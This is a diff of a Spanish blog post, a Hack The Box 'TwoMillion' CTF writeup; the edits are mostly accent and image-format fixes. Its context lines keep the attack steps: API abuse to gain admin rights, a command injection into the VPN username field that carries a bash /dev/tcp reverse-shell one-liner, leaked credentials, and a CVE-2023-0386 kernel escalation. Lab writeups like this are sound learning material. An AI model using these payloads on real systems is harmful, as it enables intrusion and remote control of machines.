@@ -1,11 +1,11 @@
 ---
 title: TwoMillion - HTB Writeup
-date: 2023-09-07 04:33:00 +0800
-categories: [Ciberseguridad, Writeups, HTB]
-tags: [Writeup, HTB, Penetration Testing, Ethical Hacking, ROT13,CVE-2023-0386]
+lang: es
+date: 2023-09-07 04:33:00 +0200
+categories: [Cybersecurity]
+tags: [Hack The Box, Linux]
 image:
-  path: /assets/img/post/twomillion/4e68d072-a3eb-4e6f-ba21-c77aee4df04a.png
-  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
+  path: /assets/img/post/twomillion/4e68d072-a3eb-4e6f-ba21-c77aee4df04a.webp
 ---
 
 TwoMillion es una máquina de dificultad `Easy` en la plataforma **Hack The Box**
@@ -24,15 +24,15 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts
 
 Vamos a acceder a la web de la máquina a ver que nos encontramos:
 
-> Nos realiza un rediccionamiento a `http://2million.htb/`
+> Nos realiza un redireccionamiento a `http://2million.htb/`
 
-![img](/assets/img/post/twomillion/135f6787-2cac-4eec-9830-bde4eed97ef5.png)
+![img](/assets/img/post/twomillion/135f6787-2cac-4eec-9830-bde4eed97ef5.webp)
 
 La página es **estática**, ninguno de los botones es funcional, menos los botones `Join` y `Login` . El que nos interesa es el `Join`, el cual nos redirige a `/invite`:
 
 ![img](/assets/img/post/twomillion/4e48a578-9bed-43a4-a170-dbd2bcc5e5cd.png)
 
-Hechandole un vistazo al código de la página, podemos ver que el botón `Submit` envia una petición por `POST` a `/api/v1/invite/verify` para realizar una comprobación de si el códio de invitación en válido o no. Tambíen encontramos un script llamado `inviteapi.min.js`. Si hacemos click encima, podemos ver que hace:
+Echándole un vistazo al código de la página, podemos ver que el botón `Submit` envía una petición por `POST` a `/api/v1/invite/verify` para realizar una comprobación de si el código de invitación en válido o no. También encontramos un script llamado `inviteapi.min.js`. Si hacemos click encima, podemos ver que hace:
 
 ```bash
 curl http://2million.htb/js/inviteapi.min.js; echo
@@ -42,7 +42,7 @@ curl http://2million.htb/js/inviteapi.min.js; echo
 
 Como podemos ver el código está **ofuscado**, para poder leerlo de manera clara, podemos utilizar recursos como [de4js](https://lelinhtinh.github.io/de4js/). Esto es lo que conseguimos de sacar el código de manera clara:
 
-![img](/assets/img/post/twomillion/9c8a3a67-e5ff-40fa-918b-3e0ebbd5500a.png)
+![img](/assets/img/post/twomillion/9c8a3a67-e5ff-40fa-918b-3e0ebbd5500a.webp)
 
 Vemos que se realiza una petición por `POST` a `/api/v1/invite/how/to/generate` , por lo tanto, vamos a realizar dicha petición utilizando `curl`:
 
@@ -52,7 +52,7 @@ curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
 
 ![img](/assets/img/post/twomillion/41a38379-b073-466c-a451-febd2653ac8a.png)
 
-Podemos ver que hay un **mensaje encriptado**, pero nos indica que tipo de cifrado, el cual es `ROT13` . Podemos acceder al recurso [rot13](https://rot13.com/) donde podemos introducir el mensaje encriptado y nos devolvera el output de manera legible. El mensaje que conseguimos es el siguiente:
+Podemos ver que hay un **mensaje encriptado**, pero nos indica que tipo de cifrado, el cual es `ROT13` . Podemos acceder al recurso [rot13](https://rot13.com/) donde podemos introducir el mensaje encriptado y nos devolverá el output de manera legible. El mensaje que conseguimos es el siguiente:
 
 ```bash
 In order to generate the invite code, make a POST request to /api/v1/invite/generate
@@ -74,7 +74,7 @@ echo "<cookie>" | base64 -d; echo
 
 ![img](/assets/img/post/twomillion/e89e916f-ec8b-4d08-9bcb-9712a1296bcc.png)
 
-Como podemos ver, hemos conseguido generar un codigo de invitación, asi que vamos a introducirlo en la web de la máquina. Como vemos nos redirige a `/register`
+Como podemos ver, hemos conseguido generar un código de invitación, así que vamos a introducirlo en la web de la máquina. Como vemos nos redirige a `/register`
 
 ![img](/assets/img/post/twomillion/27c8a4c2-078e-4a9a-b6a4-b881098518b0.png)
 
@@ -104,7 +104,7 @@ curl -v 2million.htb/api
 
 ![img](/assets/img/post/twomillion/626be95f-ba9a-479f-9d65-04ef08d18be2.png)
 
-Esta petición nos devuelve un codigo de estado `401 Unauthorized` . Vamos a proporcionar la `cookie de sesión` que hablabamos anteriormente:
+Esta petición nos devuelve un código de estado `401 Unauthorized` . Vamos a proporcionar la `cookie de sesión` que hablábamos anteriormente:
 
 ```bash
 curl -sv 2million.htb/api --cookie "PHPSESSID=<cookie>" | jq
@@ -114,7 +114,7 @@ curl -sv 2million.htb/api --cookie "PHPSESSID=<cookie>" | jq
 
 Vamos a realizar otra petición a `/api/v1` a ver que podemos sacar
 
-![img](/assets/img/post/twomillion/56a355a8-0630-49e1-b77f-baf161db8c37.png)
+![img](/assets/img/post/twomillion/56a355a8-0630-49e1-b77f-baf161db8c37.webp)
 
 En este punto obtenemos una larga lista de `endpoints` de la `api` . Los que más nos interesan son los que están relacionados con `admin`
 
@@ -134,7 +134,7 @@ curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSES
 
 ![img](/assets/img/post/twomillion/e27eab46-24e3-46a8-ae23-0ae7afa42530.png)
 
-Resulta que recibimos otro mensaje de error, vamos a hacerle caso y vamos a introducir un parametro `email` junto con la petición
+Resulta que recibimos otro mensaje de error, vamos a hacerle caso y vamos a introducir un parámetro `email` junto con la petición
 
 ```bash
 curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=rpf1pkevrhofovndhpd4d4nbl6" --header "Content-Type: application/json" --data '{"email":"test@test.com"}' | jq
@@ -150,7 +150,7 @@ curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSES
 
 ![img](/assets/img/post/twomillion/907d3492-ca0c-42d7-b35a-83f172351384.png)
 
-Nos indica que el valor del parametro `is_admin` debe tener un valor de `0 o 1`
+Nos indica que el valor del parámetro `is_admin` debe tener un valor de `0 o 1`
 
 ```bash
 curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=rpf1pkevrhofovndhpd4d4nbl6" --header "Content-Type: application/json" --data '{"email":"test@test.com","is_admin": 1}' | j
@@ -172,7 +172,7 @@ curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSI
 
 ![img](/assets/img/post/twomillion/0c340bbc-150c-45a1-af5d-02d33a7f7f8c.png)
 
-Vemos que necesitamos añadir un parametro `username` , añadiremos el que habiamos creado anteriormente
+Vemos que necesitamos añadir un parámetro `username` , añadiremos el que habíamos creado anteriormente
 
 ```bash
 curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=rpf1pkevrhofovndhpd4d4nbl6" --header "Content-Type: application/json" --data '{"username":"test"}'
@@ -180,11 +180,11 @@ curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSI
 
 ![img](/assets/img/post/twomillion/9bf6d648-b660-4df0-9576-832fee8024f9.png)
 
-Despues de realizar la petición anterior podemos ver como se generó un archivo de configuración `VPN`. Si este archivo está siendo generado a través de la función exec o system y no hay suficiente filtado, podríamos dar con una `ejecución de comandos` y así poder `inyectar código malicioso`, este lo vamos a inyectar en el campo del usuario
+Después de realizar la petición anterior podemos ver como se generó un archivo de configuración `VPN`. Si este archivo está siendo generado a través de la función exec o system y no hay suficiente filtrado, podríamos dar con una `ejecución de comandos` y así poder `inyectar código malicioso`, este lo vamos a inyectar en el campo del usuario
 
 ![img](/assets/img/post/twomillion/f986fea6-19d2-43fa-a814-3715254ce1b2.png)
 
-Vamos a introducir el oneline típico para conseguir una ``shell``, poniendonos en escucha desde otra terminal con `nc`
+Vamos a introducir el oneline típico para conseguir una ``shell``, poniéndonos en escucha desde otra terminal con `nc`
 
 > El comando `bash -i >& /dev/tcp/10.10.14.18/1234 0>&1` lo deberemos encodear en base64
 
@@ -196,7 +196,7 @@ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=r
 
 En el archivo `.env` podemos ver que hay unas credenciales `admin:SuperDuperPass123` , por lo tanto trataremos de conectarnos por `SSH` con estas credenciales:
 
-![img](/assets/img/post/twomillion/d04447ee-0c54-4523-bf8f-65606642532d.png)
+![img](/assets/img/post/twomillion/d04447ee-0c54-4523-bf8f-65606642532d.webp)
 
 Como vemos, hemos conseguido acceso a la máquina con dicho usuario, ya podemos ver la `user flag`, pero aun no tenemos permiso para ver la del root
 
@@ -206,7 +206,7 @@ En `/var/mail` podemos ver un archivo llamado `admin` , el cual contiene un `mai
 
 ![img](/assets/img/post/twomillion/8eb6d83e-b5c5-4767-97a7-4d6a20985345.png)
 
-Como vemos el mail es de un tal `ch4p`, el cual le esta diciendo a admin que hay que realizar **actualizaciones en el sistema** debido a que existen problemas serios con ``exploits en el kernel``, más especificamente un `exploit` para `OverlayFS / FUSE` . Si buscamos este exploit en google [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386) podemos ver que versiones de kernel son vulnerables a este exploit en un [foro](https://ubuntu.com/security/CVE-2023-0386) de ubuntu.
+Como vemos el mail es de un tal `ch4p`, el cual le esta diciendo a admin que hay que realizar **actualizaciones en el sistema** debido a que existen problemas serios con ``exploits en el kernel``, más específicamente un `exploit` para `OverlayFS / FUSE` . Si buscamos este exploit en google [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386) podemos ver que versiones de kernel son vulnerables a este exploit en un [foro](https://ubuntu.com/security/CVE-2023-0386) de ubuntu.
 
 Utilizando el comando `uname -a` podemos ver que en la máquina víctima tiene una versión `5.15.70 de kernel`. Si usamos el comando `lsb_release -a` podemos observar que el `codename` es `Jammy` , esto nos hace saber que esta máquina es vulnerable a este exploit del kernel
 
@@ -266,4 +266,4 @@ y así ya tendremos acceso **completo** a la máquina como root y a la **root fl
 
 ![img](/assets/img/post/twomillion/fce27810-42da-4d4e-9cc7-05512090e491.png)
 
-*Espero que os haya gustado y servido, cualquier comentario es de mucha ayuda. Adios!*
+*Espero que os haya gustado y servido, cualquier comentario es de mucha ayuda. Adiós!*
